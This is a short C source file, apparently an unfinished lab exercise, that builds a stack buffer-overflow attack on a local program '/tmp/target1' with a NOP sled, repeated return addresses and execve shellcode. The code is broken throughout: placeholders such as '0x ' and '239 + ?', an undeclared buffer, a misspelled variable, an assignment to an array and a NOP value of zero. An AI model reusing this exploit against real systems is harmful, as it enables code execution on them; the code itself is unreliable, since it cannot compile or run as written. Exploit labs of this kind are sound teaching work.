#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET  "/tmp/target1"
#define NOP     0x00000000
#define RET     0x 
#define LEN     239 + ?

int main(void)
{

	char    arg1 []   = "Hi There!";                             
	char    *args[]   = { TARGET, arg1, NULL };
	char    *env []   = { NULL };
	
	int     ret_addr = RET
    int     i;

    // Create the attack buffer
    arg1 = malloc(LEN);
    
    // Place return address into buffer
    for (i = 0; i < LEN; i+?) {
        *(int *)&buffer[i] = RET
    }
    
    // Fill the initial buffer with NOP instructions (NOP Sled)
    int nop_fill = LEN - strlen(shellcode) - ?;
    for (i = 0; i < no_fill; i++) {
        *(arg1 + i) = NOP;
    }
    
    // Copy in the execve shellcode
    memcpy(arg1 + i, shellcode, strlen(shellcode));
   
    // Check sploit
    if (0 > execve(TARGET, args, env)) {
        fprintf(stderr, "execve failed.\n");
    }

    return 0;
	
}
